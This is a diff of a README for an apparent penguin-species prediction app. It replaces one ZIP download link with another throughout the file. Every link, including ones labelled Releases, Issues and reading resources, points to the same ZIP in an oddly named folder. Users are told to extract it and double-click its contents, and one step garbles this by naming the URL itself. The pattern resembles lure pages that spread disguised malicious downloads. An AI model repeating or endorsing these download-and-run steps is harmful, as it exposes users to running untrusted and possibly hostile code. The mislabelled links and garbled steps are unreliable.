@@ -1,7 +1,7 @@
 # 🐧 Palmer-Penguin-Prediction - Simple Tool for Penguin Insights
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip)
+[![Download](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Palmer-Penguin-Prediction! This application helps you predict penguin species based on features like flipper length and bill depth. You do not need any programming knowledge to use it. Follow these steps to download and set it up.
@@ -14,14 +14,14 @@ Before you start, make sure your computer meets the following requirements:
 - **Python Version:** Python 3.6 or later (comes bundled with the application)
 
 ## 🔗 Download & Install
-To get the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip). 
+To get the application, visit this page to download: [GitHub Releases](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip). 
 
-1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip).
+1. Go to the [GitHub Releases page](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip).
 2. Look for the latest version. It will be the one at the top.
-3. Click on the `https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip` file.
+3. Click on the `https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip` file.
 4. Once the download finishes, locate the file on your computer, typically in the "Downloads" folder.
 5. Extract the ZIP file using a tool like WinRAR or the built-in extractor on your computer.
-6. Open the extracted folder and double-click on `https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip`. This will start the application.
+6. Open the extracted folder and double-click on `https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip`. This will start the application.
 
 ## 🎨 Application Features
 The Palmer-Penguin-Prediction application includes several useful features:
@@ -49,12 +49,12 @@ Yes, once installed, you do not need an internet connection to run the applicati
 You can create an issue on the GitHub repository, and our team will get back to you as soon as possible.
 
 ## 🌐 Support and Contribution
-- For support, please visit the [Issues section](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip) on GitHub.
+- For support, please visit the [Issues section](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip) on GitHub.
 - If you want to contribute, feel free to fork the repository and create a pull request.
 
 ## 🔗 Further Reading
 Interested in learning more about the project? Explore additional resources related to penguin data science and machine learning. Check out:
-- [Machine Learning Basics](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip)
-- [Python for Data Science](https://raw.githubusercontent.com/Growgrass160/Palmer-Penguin-Prediction/main/sanctimonial/Penguin_Palmer_Prediction_unicycle.zip)
+- [Machine Learning Basics](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip)
+- [Python for Data Science](https://github.com/Growgrass160/Palmer-Penguin-Prediction/raw/refs/heads/main/sanctimonial/Palmer-Penguin-Prediction-1.3.zip)
 
 Thank you for using the Palmer-Penguin-Prediction application! We hope it helps you in your journey of understanding penguins better. If you find this application useful, please consider sharing it with others who may benefit from it!
